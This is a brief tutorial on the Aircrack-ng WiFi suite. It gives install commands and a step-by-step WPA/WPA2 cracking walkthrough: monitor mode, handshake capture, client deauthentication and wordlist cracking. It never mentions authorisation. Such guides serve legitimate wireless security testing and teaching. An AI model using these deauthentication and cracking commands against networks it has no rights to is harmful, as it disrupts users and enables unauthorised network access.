What is Aircrack-ng?

Aircrack-ng is a powerful WiFi hacking suite used to assess wireless network security. It can capture packets, crack WEP/WPA/WPA2 keys, and perform replay, deauthentication, fake access point, and brute-force attacks.

Key Features

  • Wireless packet capture
  • WEP/WPA/WPA2-PSK key cracking
  • Monitor mode and packet injection
  • Support for many wireless cards and drivers

Installation

On Termux:

pkg install root-repo
pkg install aircrack-ng

On Kali Linux:

sudo apt install aircrack-ng

Verify Installation:

aircrack-ng --help

Step-by-Step Usage (WPA/WPA2)

  1. Enable monitor mode:
    airmon-ng start wlan0
  2. Find target network:
    airodump-ng wlan0mon
  3. Capture handshake:
    airodump-ng -c [channel] --bssid [router BSSID] -w capture wlan0mon
  4. Deauthenticate client:
    aireplay-ng --deauth 10 -a [BSSID] wlan0mon
  5. Crack password:
    aircrack-ng -w wordlist.txt capture.cap

Example Command

aircrack-ng -w rockyou.txt capture-01.cap
